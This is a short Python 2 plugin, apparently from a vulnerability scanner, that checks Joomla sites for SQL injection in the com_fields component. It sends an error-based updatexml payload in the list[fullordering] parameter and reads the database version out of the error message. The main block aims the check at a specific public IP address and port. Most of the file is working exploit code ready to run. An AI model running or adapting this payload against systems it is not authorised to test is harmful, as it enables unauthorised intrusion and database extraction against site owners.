#!/usr/bin/env python
# encoding: utf-8
from t import T
import requests

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='80',productname={},keywords='',hackinfo=''):

        result = {}
        timeout=3
        result['result']=False
        res=None
        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            target_url = 'http://' + ip + ':' + port + '/index.php'

        payload = '?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(2,concat(0x7e,(version())),0)'
        target_url = target_url + payload

        try:
            headers = {}
            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0';
            res = requests.get(target_url, headers=headers, timeout=timeout)
            res_html = res.content
        except Exception,e:
            print e
            return result
        finally:
            if res is not None:
                res.close()
                del res
        if 'XPATH syntax error' in res_html:
            info = target_url + "joomla sqli Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='joomla sqli Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=payload
            result['VerifyInfo']['result'] =info
            return result
        return result


if __name__ == '__main__':
    print P().verify(ip='119.90.40.147',port='8081')
